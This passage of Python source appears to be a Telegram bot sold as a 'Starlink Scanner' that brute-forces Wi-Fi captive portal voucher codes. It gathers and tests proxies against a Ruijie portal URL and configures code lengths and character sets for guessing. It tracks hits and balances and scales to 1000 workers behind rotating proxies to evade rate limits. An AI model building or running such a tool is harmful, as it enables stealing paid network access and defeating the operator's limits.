            pass
        user_proxy_checks.pop(user_id, None)
        return

    total = len(unique_proxies)
    semaphore = asyncio.Semaphore(100)
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    timeout = aiohttp.ClientTimeout(total=5)
    good_proxies = []
    checked = 0
    last_update = time.time()
    start_time = time.time()

    portal_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=c4b25b4e24cf&gw_sn=H1TC2LY000735&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.170&mac=5e:21:ad:5d:13:0d&slot_num=14&nasip=192.168.1.71&ssid=PAING&ustate=0&mac_req=1"

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for proxy in unique_proxies:
            task = asyncio.create_task(check_proxy_working(session, proxy, portal_url, semaphore, stop_event, user_id))
            tasks.append(task)

        for completed_task in asyncio.as_completed(tasks):
            if stop_event.is_set():
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break
            try:
                result = await completed_task
            except Exception:
                result = None
            if result:
                good_proxies.append(result)
            checked += 1

            now = time.time()
            if checked % 50 == 0 or now - last_update > 2 or checked == total:
                last_update = now
                pct = (checked / total) * 100 if total else 0
                elapsed = now - start_time
                speed = checked / elapsed if elapsed > 0 else 0
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=progress_msg_id,
                        text=(
                            f"🔍 PROXY CHECKER 🔍\n"
                            f"{BOT_TAGLINE}\n"
                            f"{DIV}\n"
                            f"📊 Progress: {pct:.0f}%\n"
                            f"🔎 Checked: {checked:,}/{total:,}\n"
                            f"✅ Working: {len(good_proxies)}\n"
                            f"❌ Dead: {checked - len(good_proxies)}\n"
                            f"⚡ Speed: {speed:.1f} p/s\n"
                            f"{DIV}"
                        ),
                        reply_markup=stop_kb,
                    )
                except Exception:
                    pass

    pm = get_proxy_manager()
    added = pm.add_proxies(good_proxies)

    if stop_event.is_set():
        final_text = (
            f"🛑 PROXY CHECK STOPPED\n"
            f"{BOT_TAGLINE}\n"
            f"{DIV}\n"
            f"✅ Found: {len(good_proxies)}\n"
            f"📥 Added: {added} new\n"
            f"💾 Saved to proxies.txt"
        )
    else:
        final_text = (
            f"✅ PROXY CHECK DONE ✅\n"
            f"{BOT_TAGLINE}\n"
            f"{DIV}\n"
            f"🎯 Total: {total:,}\n"
            f"✅ Working: {len(good_proxies)}\n"
            f"📥 Added: {added} new\n"
            f"💾 Saved to proxies.txt"
        )

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=progress_msg_id,
            text=final_text,
        )
    except Exception:
        pass
    user_proxy_checks.pop(user_id, None)


# ═══════════════════════════════════════════════════════════════
#  🎛️ KEYBOARDS
# ═══════════════════════════════════════════════════════════════
def get_main_menu_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🌐 Update Portal", callback_data="btn_update_portal")],
        [InlineKeyboardButton(text="⚙️ Mode", callback_data="btn_mode_menu")],
        [InlineKeyboardButton(text="➕ Add Proxies", callback_data="btn_add_proxies")],
        [InlineKeyboardButton(text="🔍 Check Proxies", callback_data="btn_proxy_checker")],
        [InlineKeyboardButton(text="🔗 Manual Proxy URL", callback_data="btn_manual_url")],
        [InlineKeyboardButton(text="♻️ Reset Proxies", callback_data="btn_reset_proxies")],
        [InlineKeyboardButton(text="⚙️ Set Workers", callback_data="btn_set_workers")],
        [InlineKeyboardButton(text="🚀 Start Scanner", callback_data="btn_start_scanner")]
    ])


def admin_only(func):
    async def wrapper(update, context, *args, **kwargs):
        user_id = update.effective_user.id
        if ADMIN_IDS and user_id not in ADMIN_IDS:
            if update.effective_message:
                await update.effective_message.reply_text(
                    f"⛔ No access\n\n💬 Buy from {OWNER}",
                )
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


def build_menu_text(ud):
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    return (
        f"⚡ Starlink Scanner Control Panel ⚡\n"
        f"\n"
        f"⚙️ Current Mode: {ud['mode']}\n"
        f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
        f"⚙️ Workers: {ud['num_workers']}"
    )


# ═══════════════════════════════════════════════════════════════
#  📞 HANDLERS
# ═══════════════════════════════════════════════════════════════
@admin_only
async def start(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud["state"] = None
    msg = await update.message.reply_text(
        build_menu_text(ud),
        reply_markup=get_main_menu_markup(),
    )
    ud["menu_msg_id"] = msg.message_id


@admin_only
async def stop_cmd(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    stopped_something = False
    if ud["task"] and not ud["task"].done():
        ud["stop_event"].set()
        ud["dash_update_event"].set()
        ud["task"].cancel()
        stopped_something = True
    pc = user_proxy_checks.get(user_id)
    if pc and pc.get("stop_event"):
        pc["stop_event"].set()
        stopped_something = True
    if stopped_something:
        await update.message.reply_text(f"🛑 Stopped\n{BOT_TAGLINE}")
    else:
        await update.message.reply_text(f"ℹ️ Nothing running\n{BOT_TAGLINE}")


@admin_only
async def handle_callbacks(update, context):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    data = query.data

    if data == "btn_update_portal":
        ud["state"] = "waiting_for_portal_url"
        await query.message.edit_text(
            f"🌐 UPDATE PORTAL\n"
            f"{BOT_TAGLINE}\n"
            f"{DIV}\n"
            f"💫 Send Portal URL\n"
        )

    elif data == "btn_mode_menu":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="🔢 6", callback_data="set_mode_num6"),
             InlineKeyboardButton(text="🔢 7", callback_data="set_mode_num7"),
             InlineKeyboardButton(text="🔢 8", callback_data="set_mode_num8"),
             InlineKeyboardButton(text="🔢 9", callback_data="set_mode_num9")],
            [InlineKeyboardButton(text="🔤 Abc 6", callback_data="set_mode_abc6")],
            [InlineKeyboardButton(text="🎲 Mix 6", callback_data="set_mode_mix6"),
             InlineKeyboardButton(text="🎲 Mix 7", callback_data="set_mode_mix7")],
            [InlineKeyboardButton(text="🎲 Mix 8", callback_data="set_mode_mix8"),
             InlineKeyboardButton(text="🎲 Mix 9", callback_data="set_mode_mix9")],
            [InlineKeyboardButton(text="⭐ Custom Start", callback_data="set_mode_custom")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="btn_back_main")]
        ])
        await query.message.edit_text(
            f"⚙️ CHOOSE MODE\n"
            f"{BOT_TAGLINE}\n"
            f"{DIV}\n"
            f"💫 ရွေးချယ်လိုက်ပါ...",
            reply_markup=keyboard,
        )

    elif data.startswith("set_mode_"):
        selected_mode = data.split("set_mode_")[1]
        if selected_mode == "num6":
            ud["mode"] = "num6"; ud["char_set"] = "012345678"; ud["code_len"] = 6; ud["start_digit"] = None
        elif selected_mode == "num7":
            ud["mode"] = "num7"; ud["char_set"] = "012345678"; ud["code_len"] = 7; ud["start_digit"] = None
        elif selected_mode == "num8":
            ud["mode"] = "num8"; ud["char_set"] = "012345678"; ud["code_len"] = 8; ud["start_digit"] = None
        elif selected_mode == "num9":
            ud["mode"] = "num9"; ud["char_set"] = "012345678"; ud["code_len"] = 9; ud["start_digit"] = None
        elif selected_mode == "abc6":
            ud["mode"] = "abc6"; ud["char_set"] = "abcdefghijkmnpqrstuvwxyz"; ud["code_len"] = 6; ud["start_digit"] = None
        elif selected_mode == "mix6":
            ud["mode"] = "mix6"; ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud["code_len"] = 6; ud["start_digit"] = None
        elif selected_mode == "mix7":
            ud["mode"] = "mix7"; ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud["code_len"] = 7; ud["start_digit"] = None
        elif selected_mode == "mix8":
            ud["mode"] = "mix8"; ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud["code_len"] = 8; ud["start_digit"] = None
        elif selected_mode == "mix9":
            ud["mode"] = "mix9"; ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud["code_len"] = 9; ud["start_digit"] = None
        elif selected_mode == "custom":
            ud["mode"] = "custom"; ud["char_set"] = "012345678"; ud["code_len"] = 6
            ud["state"] = "waiting_for_digit"
            await query.message.edit_text(
                f"⭐ CUSTOM START\n"
                f"{BOT_TAGLINE}\n"
                f"{DIV}\n"
                f"🔢 Send start digit (0-9)",
            )
            return
        await query.message.edit_text(
            build_menu_text(ud),
            reply_markup=get_main_menu_markup(),
        )

    elif data == "btn_back_main":
        await query.message.edit_text(
            build_menu_text(ud),
            reply_markup=get_main_menu_markup(),
        )

    elif data == "btn_add_proxies":
        ud["state"] = "waiting_for_proxy_text"
        await query.message.edit_text(
            f"➕ ADD PROXIES\n"
            f"{BOT_TAGLINE}\n"
            f"{DIV}\n"
            f"💫 Send proxies\n"
            f"📝 One per line",
        )

    elif data == "btn_proxy_checker":
        await query.message.edit_text("⏳ Starting proxy check...")
        asyncio.create_task(run_proxy_check(context, query.message.chat_id, user_id))

    elif data == "btn_manual_url":
        ud["state"] = "waiting_for_proxy_url"
        await query.message.edit_text(
            f"🔗 MANUAL PROXY URL\n"
            f"{BOT_TAGLINE}\n"
            f"{DIV}\n"
            f"💫 Send URL",
        )

    elif data == "btn_reset_proxies":
        pm = get_proxy_manager()
        pm.clear_file()
        await query.message.edit_text(
            f"♻️ RESET PROXIES\n"
            f"{BOT_TAGLINE}\n"
            f"{DIV}\n"
            f"✅ proxies.txt cleared\n"
            f"🔀 Proxies: 0/0",
            reply_markup=get_main_menu_markup(),
        )

    elif data == "btn_set_workers":
        ud["state"] = "waiting_for_workers"
        await query.message.edit_text(
            f"⚙️ SET WORKERS\n"
            f"{BOT_TAGLINE}\n"
            f"{DIV}\n"
            f"📊 Current: {ud['num_workers']}\n"
            f"💡 Range: 1 - 1000\n"
            f"{DIV}\n"
            f"✏️ Enter new number:",
        )

    elif data == "btn_start_scanner":
        if not ud["portal_url"]:
            await query.message.edit_text("❌ Portal URL missing")
            return
        if ud["task"] and not ud["task"].done():
            ud["stop_event"].set()
            ud["dash_update_event"].set()
            ud["task"].cancel()
            try:
                await asyncio.wait_for(ud["task"], timeout=3.0)
            except Exception:
                pass
        ud["stop_event"].clear()
        ud["stats"] = {"tried": 0, "hits": 0, "expired": 0, "limits": 0, "start_time": time.time()}
        ud["valid_codes"] = []
        ud["limit_codes"] = []
        ud["tried_codes"] = set()
        ud["recent_logs"] = []
        ud["CURRENT_CODE"] = "----"
        ud["balance_queue"] = asyncio.Queue()
        await query.message.edit_text(
            f"🚀 STARTING SCANNER\n"
            f"{BOT_TAGLINE}\n"
            f"{DIV}\n"
            f"⏳ Initializing...",
        )
        ud["dash_msg_id"] = query.message.message_id
        asyncio.create_task(run_user_scanner(context, user_id))

    elif data == "stop_scan":
        ud["stop_event"].set()
        ud["dash_update_event"].set()
        if ud["task"] and not ud["task"].done():
            ud["task"].cancel()


@admin_only
async def handle_text(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    state = ud.get("state")
    text = update.message.text.strip()

    if state == "waiting_for_portal_url":
        if not text.startswith("http"):
            await update.message.reply_text("❌ Invalid URL")
            return
        ud["portal_url"] = text
        ud["state"] = None
        try:
            with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
                f.write(text)
        except Exception:
            pass
        msg = await update.message.reply_text(
            f"✅ PORTAL SAVED\n\n" + build_menu_text(ud),
            reply_markup=get_main_menu_markup(),
        )
        ud["menu_msg_id"] = msg.message_id

    elif state == "waiting_for_digit":
        if text in ud["char_set"] and len(text) == 1:
            ud["start_digit"] = text
        else:
            ud["start_digit"] = "0"
        ud["state"] = None
        msg = await update.message.reply_text(
            f"✅ Start Digit = {ud['start_digit']}\n\n" + build_menu_text(ud),
            reply_markup=get_main_menu_markup(),
        )
        ud["menu_msg_id"] = msg.message_id

    elif state == "waiting_for_workers":
        try:
            n = int(text)
            if 1 <= n <= 1000:
                ud["num_workers"] = n
                ud["state"] = None
                msg = await update.message.reply_text(
                    f"✅ Workers = {n}\n\n" + build_menu_text(ud),
                    reply_markup=get_main_menu_markup(),
                )
                ud["menu_msg_id"] = msg.message_id
            else:
                await update.message.reply_text("❌ Range 1-1000")
        except ValueError:
            await update.message.reply_text("❌ Send number only")

    elif state == "waiting_for_proxy_url":
        if not text.startswith("http"):
            await update.message.reply_text("❌ Invalid URL")
            return
        ud["state"] = None
        await update.message.reply_text("⏳ Checking...")
        asyncio.create_task(run_proxy_check(context, update.message.chat_id, user_id, sources=[text]))

    elif state == "waiting_for_proxy_text":
        lines = [line.strip() for line in text.splitlines() if line.strip()]
        if not lines:
            await update.message.reply_text("❌ Empty")
            return
        try:
            pm = get_proxy_manager()
            added = pm.add_proxies(lines)
            total, active = pm.stats()
            ud["state"] = None
            msg = await update.message.reply_text(
                f"✅ PROXIES SAVED\n"
                f"{DIV}\n"
                f"➕ Added: {added}\n"
                f"📊 Total: {total}\n"
                f"✅ Active: {active}\n\n" + build_menu_text(ud),
                reply_markup=get_main_menu_markup(),
            )
            ud["menu_msg_id"] = msg.message_id
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")


# ═══════════════════════════════════════════════════════════════
#  🚀 MAIN
# ═══════════════════════════════════════════════════════════════
def main():
    check_approval()
    start_web()
    bot_token = get_token()
    pm = get_proxy_manager()
    total, active = pm.stats()
    print(f"{CYAN}[MAIN] Proxies: {active}/{total}{RESET}")
    print(f"{MAGENTA}[MAIN] Owner: {OWNER}{RESET}")
    app = Application.builder().token(bot_token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    print(f"{GREEN}[MAIN] Bot running...{RESET}")
    print(f"{YELLOW}{BOT_TAGLINE}{RESET}")
    app.run_polling()


if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        pass
